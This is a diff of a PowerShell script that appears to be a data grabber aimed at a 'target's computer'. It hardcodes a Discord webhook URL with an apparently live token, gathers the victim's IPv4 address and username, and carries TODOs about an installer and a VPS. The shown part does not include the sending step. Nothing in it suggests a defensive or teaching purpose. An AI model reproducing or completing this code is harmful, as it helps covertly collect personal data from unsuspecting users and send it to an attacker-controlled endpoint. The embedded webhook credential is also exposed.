@@ -1,18 +1,11 @@
 # None of the files created will be saved on the target's computer
-# Need to implement V-f
+# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
 # Define the Discord webhook URL
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD"
 
-# Get the Wi-Fi IPv4 Address, or use Ethernet if Wi-Fi is not available
-$WiFIIP = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
-$EthernetIP = (Get-NetIPAddress -InterfaceAlias "Ethernet" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
-
-$IPAddress = $WiFIIP
-
-if ([string]::IsNullOrEmpty($IPAddress)) {
-    $IPAddress = $EthernetIP
-}
+# Get the Wi-Fi IPv4 Address
+$IPAddress = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
 
 # Get the current user's username
 $Username = $env:USERNAME
